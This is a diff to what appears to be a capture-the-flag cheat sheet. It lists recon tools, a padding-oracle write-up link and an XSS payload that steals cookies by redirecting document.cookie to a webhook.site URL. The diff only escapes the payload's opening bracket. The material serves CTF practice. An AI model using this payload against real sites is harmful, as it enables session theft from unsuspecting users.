@@ -48,7 +48,8 @@ this command will find the information to username admin stored in database (SQL
 * use dirsearch to find hidden directories.
 * use nmap to see available ports.
 * Padding Oracle attacks :- https://phantominfosec.wordpress.com/2018/12/23/hackthebox-web-challenge-i-know-mag1k/
-* Using XSS to get cookies :- "<img src=x onerror="javascript:document.location='https://webhook.site/b53c0b7c-a7e5-4998-8cd1-6da504438ef7?c='+document.cookie"></img>"
+* Using XSS to get cookies :- (<)img src=x onerror="javascript:document.location='https://webhook.site/b53c0b7c-a7e5-4998-8cd1-6da504438ef7?c='+document.cookie"></img>
+// i have done (<) here to avoid the error
 
 ## <a name = "misc">Misc</a>
 * Esoteric languages(pikalang, 2dfuck, brainfuck) use tio.run website, Malboge an esoteric language that looks like base 85.
